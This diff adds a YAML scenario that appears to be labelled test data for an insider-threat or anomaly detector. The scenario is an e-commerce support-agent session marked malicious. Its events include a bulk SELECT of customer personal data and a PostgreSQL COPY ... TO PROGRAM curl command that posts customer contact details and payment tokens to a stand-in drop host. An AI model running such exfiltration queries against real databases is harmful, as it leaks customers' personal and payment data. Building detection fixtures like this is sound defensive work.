@@ -1,0 +1,23 @@
+scenario_id: ecommerce_support_agent_pii_dump_0024
+family_id: ecommerce_support_agent_pii_dump_0024
+domain: ecommerce
+time_of_day: '13:30'
+default_class: malicious
+rule_engine_relationship: agrees
+sessions:
+- session_label: pii_dump
+  role: support_agent
+  class: malicious
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.0174413018008077
+  events:
+  - sql: SELECT email, phone, shipping_address, full_name FROM customers WHERE created_at > NOW() - INTERVAL '365 days'
+  - step_id: exfil
+    sql: COPY (SELECT c.email, c.phone, c.shipping_address, pay.card_last4, pay.card_token FROM customers c JOIN orders o ON o.customer_id = c.customer_id JOIN payments pay ON pay.order_id = o.order_id)
+      TO PROGRAM 'curl -sX POST https://drop.example.net/upload -d @-'
+    connects_to:
+      ip: 93.184.216.34
+      port: 443
